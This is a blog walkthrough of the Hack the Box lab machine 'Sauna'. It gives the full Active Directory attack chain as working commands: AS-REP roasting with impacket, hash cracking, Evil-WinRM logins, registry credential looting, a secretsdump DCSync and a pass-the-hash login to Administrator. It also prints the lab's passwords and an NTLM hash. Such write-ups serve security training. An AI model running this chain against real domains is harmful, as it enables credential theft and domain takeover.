+++
author = "Nick"
categories = ["hack the box", "windows", "easy", "evil-winrm", "impacket"]
date = 2020-07-18T14:59:00Z
description = ""
draft = false
thumbnail = "/images/2020/02/info.png"
slug = "hack-the-box-sauna"
summary = "Today's post is for the Hack the Box machine - Sauna. It's a Windows machine with a difficulty listed as easy. Let's jump in!"
tags = ["hack the box", "windows", "easy", "evil-winrm", "impacket"]
title = "Hack the Box - Sauna"
url = "/hack-the-box-sauna"

+++


Welcome back! Today's post is for the Hack the Box machine - Sauna. It's a Windows machine with a difficulty listed as easy. Let's jump in!

As always, we start with our standard `nmap` scan: `nmap -sC -sV -p- -oA all_ports 10.10.10.175`

```
Nmap scan report for 10.10.10.175
Host is up (0.055s latency).
Not shown: 65515 filtered ports
PORT      STATE SERVICE       VERSION
53/tcp    open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Egotistical Bank :: Home
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-02-21 04:11:24Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49671/tcp open  msrpc         Microsoft Windows RPC
49682/tcp open  msrpc         Microsoft Windows RPC
49692/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=2/20%Time=5E4EE79D%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
SF:x04bind\0\0\x10\0\x03");
Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 8h01m23s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2020-02-21T04:13:44
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 393.56 seconds
```

We see a few things right off the bat. A site being hosted on port 80, LDAP, WinRM and RPC ports available as well as SMB. We get back a domain for LDAP, `EGOTISTICAL-BANK.LOCAL0`.

We'll start with enumerating the web site by hand. While we do that we'll also kick of a `gobuster` scan.

Command:
`gobuster dir -u http://10.10.10.175 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 15`

We'll also run the `nmap` script for ldap enumeration.

Command:
`nmap -n -sV --script "ldap*" -p 389 10.10.10.175`

We get a large output from this as well. At the bottom of the output we see we do indeed have a user. Hugo Smith. Now this doesn't quite match up with the users we saw on the about.html page, clever.

![](/images/2020/02/image.png)

We continue to enumerate the website but don't find anything. Our `gobuster` comes back with the same results we saw while we were manually browsing the site and source.

Now if you are familiar with attacking Windows machines you might be familiar with Kerberos and how much fun it is to break! In this case the first thing we are going to try is to leverage the Active Directory setting called 'Disabling Kerberos Pre-Authentication'. In short, [without Kerberos Pre-Authentication a malicious attacker can directly send a dummy request for authentication](https://social.technet.microsoft.com/wiki/contents/articles/23559.kerberos-pre-authentication-why-it-should-not-be-disabled.aspx). In order for this to work, we need a list of user. We have one user for sure. So we'll create a list of potential Active Directory names that this user could go by. 

```
hsmith
hugosmith
h.smith
hu.smith
hugo.smith
smith.hugo
smithh 
smith.h
```

Command:
`python3 GetNPUsers.py -format john -usersfile ~/Documents/htb/sauna/users.lst EGOTISTICAL-BANK.local/ -o ~/Documents/htb/sauna/impacket_output.txt
`

We get a hit on `hsmith`. Now we know the naming convention. We also noticed the about page with a list of the team members on it. We can then infer the names of these users in Active directory to have the same convention as above. We will compile them into a list and run that through the same impacket script.

```
fsmith
scoins
btaylor
sdriver
hbear
```

Once we do that we see four Session errors, but we have 5 users! We have a hash!

![](/images/2020/02/sauna-user.gif)

Now that we have a hash, let's crack it!

Command:
`john --wordlist=/usr/share/wordlists/rockyou.txt impacket_output.txt`

![](/images/2020/02/image-1.png)

We have a password of `Thestroke23`. Awesome, now we can potentially leverage this in `Evil-WinRM`.

![](/images/2020/02/image-2.png)

Turns out we can! We log in as fsmith and move right to the Desktop and snag our user.txt. Now it's time to start enumerating internally. We'll upload `WinPEAS` to the machine and run it to see what we can find.

Command:
`*Evil-WinRM* PS> upload /root/Tools/peas/winPEAS/winPEASbat/winPEAS.bat`
`*Evil-WinRM* PS> .\winPEAS.bat`

After you run the script, you should see some credentials. Alternatly, if you cannot get WinPEAS to run. You can run each of the queries it runs, manually. This isn't a terrible idea, especially if you could use some practice on enumerating your Windows machines. The key we are looking for is in this query:

Command:
`reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"`

![](/images/2020/02/image-3.png" caption=")

We see a set of stored credentials! Let's pivot to this user just like we did with fsmith. However, this username doesn't match up with the users we saw. The enumerated username as shown by `WinPEAS` or manual enumeration is svc_loanmgr.

Command:
`./evil-winrm.rb -i 10.10.10.175 -u svc_loanmgr -p 'Moneymakestheworldgoround!'`

![](/images/2020/02/image-4.png)

Once we've connected as this service account we can do a few things. Normally I use `Bloodhound` to enumerate a second account but before I try that I try some basic things like Impackets [`secretdump.py`](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py), WINpeas and some other internal commands. In this case, secrets dump works out!

Command:
`impacket-secretsdump -just-dc-ntlm egotisticalbank/svc_loanmgr@10.10.10.175`

![](/images/2020/02/sauna_secret_dump.gif)

You could also replicate this same technique by upload `mimikatz` and executing `lsadump`. Now we see we have an NTLM hash for our Administrator account. We have a few options.  We can crack the hash offline, we can use attempt to use some tools with these hashed credentials like `psexec.py` or we can login with the hash via `Evil-WinRM`. 

In this case I'll just login with `Evil-WinRM`.

Command:
`Evil-WinRM -i 10.10.10.175 -u Administrator -H d9485863c1e9e05851aa40cbb4ab9dff`

![](/images/2020/02/admin_winrm.gif)

And we are in! We head over to the Desktop and grab the flag! Root acquired! I hope you enjoyed this box. All in all I would say this is a great box for understanding Windows' entry techniques.

Think about sending me some respect over on HTB if you enjoyed the write-up! Here's my [profile](https://www.hackthebox.eu/home/users/profile/95635).



